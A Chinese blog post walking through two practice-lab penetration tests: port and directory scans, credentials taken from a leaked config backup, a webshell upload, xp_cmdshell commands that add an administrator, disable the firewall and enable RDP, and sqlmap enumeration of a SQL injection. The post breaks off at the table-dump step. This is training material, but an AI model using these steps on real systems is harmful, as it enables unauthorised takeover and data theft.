@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>13.1-打靶 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="靶场1Acunetix登陆信息 账号：&amp;#99;&amp;#105;&amp;#x73;&amp;#112;&amp;#45;&amp;#112;&amp;#116;&amp;#101;&amp;#x40;&amp;#x71;&amp;#105;&amp;#x61;&amp;#110;&amp;#120;&amp;#x69;&amp;#110;&amp;#46;&amp;#x63;&amp;#x6f;&amp;#x6d; 密码：&amp;#x50;&amp;#x54;&amp;#x45;&amp;#x40;&amp;#113;&amp;#105;&amp;#97;&amp;#110;&amp;#120;&amp;#105;&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="13.1-打靶">
+<meta property="og:url" content="http://example.com/2024/01/14/13.1-%E6%89%93%E9%9D%B6/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="靶场1Acunetix登陆信息 账号：&amp;#99;&amp;#105;&amp;#x73;&amp;#112;&amp;#45;&amp;#112;&amp;#116;&amp;#101;&amp;#x40;&amp;#x71;&amp;#105;&amp;#x61;&amp;#110;&amp;#120;&amp;#x69;&amp;#110;&amp;#46;&amp;#x63;&amp;#x6f;&amp;#x6d; 密码：&amp;#x50;&amp;#x54;&amp;#x45;&amp;#x40;&amp;#113;&amp;#105;&amp;#97;&amp;#110;&amp;#120;&amp;#105;&amp;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240109195023444.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110202904933.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110105833617.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110203013665.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110110927269.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110110959184.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110113406745.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110151128428.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110203644109.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110151415124.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110151352506.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110153256389.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110151630618.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110151747564.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110153431975.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110203845863.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110204047649.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110204112777.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110205908475.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110205944108.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110210006570.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112100806283.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112100827070.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112100917930.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112101059740.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112101642340.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112102453400.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112144514810.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112101925160.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112102024873.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112102713044.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112102813682.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112105341258.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112105455287.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112105852983.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112111954540.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112112123088.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112145530249.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112145903618.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112145954774.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/sdasdada.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112151048238.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112152009209.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112160401126.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112160432011.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112161333145.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112161434726.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112161623448.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112161910843.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112162145297.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112162847786.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112163150238.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112163258961.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112163344746.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112163745913.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112163831778.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112163853593.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112164048162.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112164143780.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112112552131.png">
+<meta property="article:published_time" content="2024-01-14T01:11:32.080Z">
+<meta property="article:modified_time" content="2024-01-14T01:00:05.491Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240109195023444.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-13.1-打靶" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/01/14/13.1-%E6%89%93%E9%9D%B6/" class="article-date">
+  <time class="dt-published" datetime="2024-01-14T01:11:32.080Z" itemprop="datePublished">2024-01-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      13.1-打靶
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="靶场1"><a href="#靶场1" class="headerlink" title="靶场1"></a>靶场1</h3><p>Acunetix登陆信息</p>
+<p>账号：<a href="mailto:&#99;&#105;&#x73;&#112;&#45;&#112;&#116;&#101;&#x40;&#x71;&#105;&#x61;&#110;&#120;&#x69;&#110;&#46;&#x63;&#x6f;&#x6d;">&#99;&#105;&#x73;&#112;&#45;&#112;&#116;&#101;&#x40;&#x71;&#105;&#x61;&#110;&#120;&#x69;&#110;&#46;&#x63;&#x6f;&#x6d;</a></p>
+<p>密码：<a href="mailto:&#x50;&#x54;&#x45;&#x40;&#113;&#105;&#97;&#110;&#120;&#105;&#110;&#x2e;&#x63;&#x6f;&#109;">&#x50;&#x54;&#x45;&#x40;&#113;&#105;&#97;&#110;&#120;&#105;&#110;&#x2e;&#x63;&#x6f;&#109;</a></p>
+<p><a target="_blank" rel="noopener" href="https://192.168.2.197/">https://192.168.2.197/</a></p>
+<h4 id="1-扫端口"><a href="#1-扫端口" class="headerlink" title="1.扫端口"></a>1.扫端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.2.197 </span><br></pre></td></tr></table></figure>
+
+<p>135&#x2F;tcp open  msrpc<br>139&#x2F;tcp open  netbios-ssn<br>445&#x2F;tcp open  microsoft-ds</p>
+<p>1026&#x2F;tcp open  LSA-or-nterm</p>
+<p>1433&#x2F;tcp  sql server20058</p>
+<p>3389&#x2F;tcp open  ms-wbt-server</p>
+<p>27689&#x2F;tcp open</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240109195023444.png" alt="image-20240109195023444"></p>
+<p>27689端口能进</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110202904933.png" alt="image-20240110202904933"></p>
+<h4 id="2-其他信息"><a href="#2-其他信息" class="headerlink" title="2.其他信息"></a>2.其他信息</h4><p>OS: Linux 3.10 - 4.11 | 4.14 - 4.19, OpenSSH 7.6 (protocol 2.0), Apache httpd 2.4</p>
+<p>操作系统：Linux 3.10-4.11 | 4.14-4.19、OpenSSH 7.6（协议2.0）、Apache httpd 2.4</p>
+<p>OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;a:openssh:openssh:7.6</p>
+<p>运行：Linux 3.X|4.X</p>
+<p>操作系统CPE:CPE:&#x2F;o:linux:linux_kernel:3cpe:&#x2F;o:linux:linux _kernel:4cpe:&#x2F;a:openssh:opensssh:7.6</p>
+<p>操作系统详细信息：Linux 3.10-4.11，Linux 4.14-4.19</p>
+<h4 id="3-扫目录"><a href="#3-扫目录" class="headerlink" title="3.扫目录"></a>3.扫目录</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;ip&quot; -x 401,403</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110105833617.png" alt="image-20240110105833617"></p>
+<p>只有robots.txt文件能打开</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.197:27689/robots.txt">http://192.168.2.197:27689/robots.txt</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br><span class="line"></span><br><span class="line">/Default.aspx</span><br><span class="line">/admin/</span><br><span class="line">/upfile/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110203013665.png" alt="image-20240110203013665"></p>
+<p>文件web.config.bak能下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.197:27689/web.config.bak</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">	&lt;appSettings&gt;</span><br><span class="line">  &lt;add key=&quot;DBConnectionString&quot; value=&quot;server=127.0.0.1;database=FileManage;User Id=down;pwd=downsql&quot; /&gt;</span><br><span class="line"> &lt;/appSettings&gt;</span><br><span class="line">	</span><br><span class="line">	&lt;system.web&gt;</span><br><span class="line">		&lt;!-- </span><br><span class="line">            设置 compilation debug=&quot;true&quot; 将调试符号插入</span><br><span class="line">            已编译的页面中。但由于这会 </span><br><span class="line">            影响性能，因此只在开发过程中将此值 </span><br><span class="line">            设置为 true。</span><br><span class="line">        --&gt;</span><br><span class="line">		&lt;compilation debug=&quot;true&quot;/&gt;</span><br><span class="line">		&lt;!--</span><br><span class="line">            通过 &lt;authentication&gt; 节可以配置 ASP.NET 使用的 </span><br><span class="line">            安全身份验证模式，</span><br><span class="line">            以标识传入的用户。 </span><br><span class="line">        --&gt;</span><br><span class="line">		&lt;authentication mode=&quot;Windows&quot;/&gt;</span><br><span class="line">		&lt;!--</span><br><span class="line">            如果在执行请求的过程中出现未处理的错误，</span><br><span class="line">            则通过 &lt;customErrors&gt; 节可以配置相应的处理步骤。具体说来，</span><br><span class="line">            开发人员通过该节可以配置</span><br><span class="line">            要显示的 html 错误页</span><br><span class="line">            以代替错误堆栈跟踪。</span><br><span class="line"></span><br><span class="line">        &lt;customErrors mode=&quot;off&quot; defaultRedirect=&quot;GenericErrorPage.htm&quot;&gt;</span><br><span class="line">            &lt;error statusCode=&quot;403&quot; redirect=&quot;NoAccess.htm&quot; /&gt;</span><br><span class="line">            &lt;error statusCode=&quot;404&quot; redirect=&quot;FileNotFound.htm&quot; /&gt;</span><br><span class="line">        &lt;/customErrors&gt;</span><br><span class="line">        --&gt;</span><br><span class="line">&lt;customErrors mode=&quot;Off&quot;/&gt;</span><br><span class="line">	&lt;/system.web&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User Id=down;pwd=downsql</span><br></pre></td></tr></table></figure>
+
+<p>从前面知道1433端口是sql server端口，而且open，而从web.config中得到了数据库账号密码</p>
+<h4 id="4-登陆数据库"><a href="#4-登陆数据库" class="headerlink" title="4.登陆数据库(*)"></a>4.登陆数据库(*)</h4><p>利用navicat</p>
+<p>在数据库表中获得数据：</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110110927269.png" alt="image-20240110110927269"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key3:4d9d3q8v</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-获得登陆账号密码"><a href="#5-获得登陆账号密码" class="headerlink" title="5.获得登陆账号密码"></a>5.获得登陆账号密码</h4><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110110959184.png" alt="image-20240110110959184"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1	admin	asdadwn_d2112	admin	admin	010-88327562			0	0			0		2009-02-07 11:14:54.420	2009-02-07 11:14:54.420</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110113406745.png" alt="image-20240110113406745"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key1:4k3s9m3d</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-上传病毒文件"><a href="#6-上传病毒文件" class="headerlink" title="6.上传病毒文件"></a>6.上传病毒文件</h4><p>登陆</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110151128428.png" alt="image-20240110151128428"></p>
+<p>需要改名，长度太长会被截取</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110203644109.png" alt="image-20240110203644109"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110151415124.png" alt="image-20240110151415124"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110151352506.png" alt="image-20240110151352506"></p>
+<p>文件得全英文！</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110153256389.png" alt="image-20240110153256389"></p>
+<p>文件上传成功</p>
+<p>右键复制图片下载地址</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110151630618.png" alt="image-20240110151630618"></p>
+<p>将其中的数字删几个再在浏览器上运行，浏览器就会报错，我们就可以得到文件保存地址。</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110151747564.png" alt="image-20240110151747564"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\web\upfile\affix\</span><br></pre></td></tr></table></figure>
+
+<p>需要改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.197:27689/upfile/affix/638287761416968941-aabcdaaa.aspx</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-蚁剑"><a href="#7-蚁剑" class="headerlink" title="7.蚁剑(*)"></a>7.蚁剑(*)</h4><p>上传到蚁剑上</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110153431975.png" alt="image-20240110153431975"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110203845863.png" alt="image-20240110203845863"></p>
+<p>成功</p>
+<p>获得key2</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110204047649.png" alt="image-20240110204047649"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110204112777.png" alt="image-20240110204112777"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key2:2a3s9p4d</span><br></pre></td></tr></table></figure>
+
+<h4 id="8-提权"><a href="#8-提权" class="headerlink" title="8.提权"></a>8.提权</h4><p>在navicat中提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">USE master</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1</span><br><span class="line">exec master..xp_cmdshell &#x27;net user admin 1qaz@WSX /add&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;net localgroup administrator admin /add&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;netsh firewall set opmode disable&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;netstat -anop tcp | find &quot;3389&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">账号：administrator 密码：1qaz@WSX</span><br></pre></td></tr></table></figure>
+
+<h4 id="9-利用mstsc登陆（-）"><a href="#9-利用mstsc登陆（-）" class="headerlink" title="9.利用mstsc登陆（*）"></a>9.利用mstsc登陆（*）</h4><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110205908475.png" alt="image-20240110205908475"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110205944108.png" alt="image-20240110205944108"></p>
+<p>成功登陆</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240110210006570.png" alt="image-20240110210006570"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key3:4d9d3q8v</span><br></pre></td></tr></table></figure>
+
+<h3 id="靶场2"><a href="#靶场2" class="headerlink" title="靶场2"></a>靶场2</h3><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>导入靶机，虚拟机设置</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112100806283.png" alt="image-20240112100806283"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112100827070.png" alt="image-20240112100827070"></p>
+<h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><h5 id="查看mac地址"><a href="#查看mac地址" class="headerlink" title="查看mac地址"></a>查看mac地址</h5><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112100917930.png" alt="image-20240112100917930"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00:0C:29:46:9C:DD</span><br></pre></td></tr></table></figure>
+
+<h5 id="查询ip"><a href="#查询ip" class="headerlink" title="查询ip"></a>查询ip</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112101059740.png" alt="image-20240112101059740"></p>
+<p>ip为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.33.128</span><br></pre></td></tr></table></figure>
+
+<h5 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.33.128</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112101642340.png" alt="image-20240112101642340"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE  SERVICE</span><br><span class="line">22/tcp closed ssh</span><br><span class="line">80/tcp open   http</span><br></pre></td></tr></table></figure>
+
+<p>80端口开着，22端口关着，不能远程，只能先在80端口操作</p>
+<h5 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;192.168.33.128&quot; -x 401,403</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112102453400.png" alt="image-20240112102453400"></p>
+<p>只扫出一个index.html文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.33.128/Hackademic_RTB1&quot; -x 403,401</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112144514810.png" alt="image-20240112144514810"></p>
+<h5 id="访问ip"><a href="#访问ip" class="headerlink" title="访问ip"></a>访问ip</h5><p><a target="_blank" rel="noopener" href="http://192.168.33.128/">http://192.168.33.128/</a></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112101925160.png" alt="image-20240112101925160"></p>
+<p>试出页面</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.33.128/Hackademic_RTB1/?p=9">http://192.168.33.128/Hackademic_RTB1/?p=9</a></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112102024873.png" alt="image-20240112102024873"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.33.128/Hackademic_RTB1/?cat=1">http://192.168.33.128/Hackademic_RTB1/?cat=1</a></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112102713044.png" alt="image-20240112102713044"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.33.128/Hackademic_RTB1/?p=9#comments">http://192.168.33.128/Hackademic_RTB1/?p=9#comments</a></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112102813682.png" alt="image-20240112102813682"></p>
+<h5 id="尝试sql注入"><a href="#尝试sql注入" class="headerlink" title="尝试sql注入"></a>尝试sql注入</h5><p>发现sql注入漏洞</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.33.128/Hackademic_RTB1/?cat=1%27">http://192.168.33.128/Hackademic_RTB1/?cat=1%27</a></p>
+<p>sqlmap一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.33.128/Hackademic_RTB1/?cat=1&quot; --batch -dbs </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112105341258.png" alt="image-20240112105341258"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240112105455287.png" alt="image-20240112105455287"></p>
+<p>扫出三个数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] wordpress</span><br></pre></td></tr></table></figure>
+
+<p>扫表</p>
